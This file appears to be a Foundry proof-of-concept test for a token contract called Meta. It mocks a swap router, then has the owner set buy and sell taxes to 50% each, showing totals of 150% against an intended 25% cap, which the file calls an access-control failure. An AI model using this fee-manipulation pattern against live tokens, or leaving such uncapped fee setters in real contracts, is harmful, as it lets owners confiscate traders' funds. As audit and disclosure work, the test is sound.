// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Meta.sol";

contract ELFM_Test is Test {
    Meta public token;
    address owner = address(0xABCD);
    
    // Mock addresses
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address mockFactory = address(0x1111);
    address mockWETH = address(0x2222);
    address mockPair = address(0x3333);
    
    function setUp() public {
        // Mock router factory() call (any caller, any args)
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("factory()"),
            abi.encode(mockFactory)
        );
        
        // Mock router WETH() call (any caller, any args)
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("WETH()"),
            abi.encode(mockWETH)
        );
        
        // Mock factory createPair() call (any arguments)
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );
        
        vm.startPrank(owner);
        token = new Meta();
        vm.stopPrank();
    }

    function test_FeeManipulation() public {
        uint256 unsafeFee = 50; // 50% fee (exceeds 25% limit)
        
        console.log("--- BEFORE FEE MANIPULATION ATTACK ---");
        console.log("Buy Liquidity Fee: ", token._buyLiquidityFee());
        console.log("Buy Marketing Fee: ", token._buyMarketingFee());
        console.log("Buy Team Fee: ", token._buyTeamFee());
        console.log("Sell Liquidity Fee: ", token._sellLiquidityFee());
        console.log("Sell Marketing Fee: ", token._sellMarketingFee());
        console.log("Sell Team Fee: ", token._sellTeamFee());
        console.log("Total Buy Tax: ", token._totalTaxIfBuying());
        console.log("Total Sell Tax: ", token._totalTaxIfSelling());
        
        console.log("--- EXECUTING FEE MANIPULATION ATTACK ---");
        vm.startPrank(owner);
        // Set buy fees to dangerously high values
        token.setBuyTaxes(unsafeFee, unsafeFee, unsafeFee);
        // Set sell fees to dangerously high values
        token.setSelTaxes(unsafeFee, unsafeFee, unsafeFee);
        vm.stopPrank();
        
        console.log("--- AFTER FEE MANIPULATION ATTACK ---");
        console.log("Buy Liquidity Fee: ", token._buyLiquidityFee());
        console.log("Buy Marketing Fee: ", token._buyMarketingFee());
        console.log("Buy Team Fee: ", token._buyTeamFee());
        console.log("Sell Liquidity Fee: ", token._sellLiquidityFee());
        console.log("Sell Marketing Fee: ", token._sellMarketingFee());
        console.log("Sell Team Fee: ", token._sellTeamFee());
        console.log("Total Buy Tax: ", token._totalTaxIfBuying());
        console.log("Total Sell Tax: ", token._totalTaxIfSelling());
        
        // Vulnerability check: verify all fees were set to unsafe values (50%) and totals became 150%
        bool vulnerabilityExists = true;
        vulnerabilityExists = vulnerabilityExists && token._buyLiquidityFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._buyMarketingFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._buyTeamFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._sellLiquidityFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._sellMarketingFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._sellTeamFee() == unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._totalTaxIfBuying() == 3 * unsafeFee;
        vulnerabilityExists = vulnerabilityExists && token._totalTaxIfSelling() == 3 * unsafeFee;
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Fees successfully set beyond 25% limit proving access control failure");
        } else {
            console.log("Vulnerability not Exist: Fee manipulation failed indicating security controls are functional");
        }
    }
}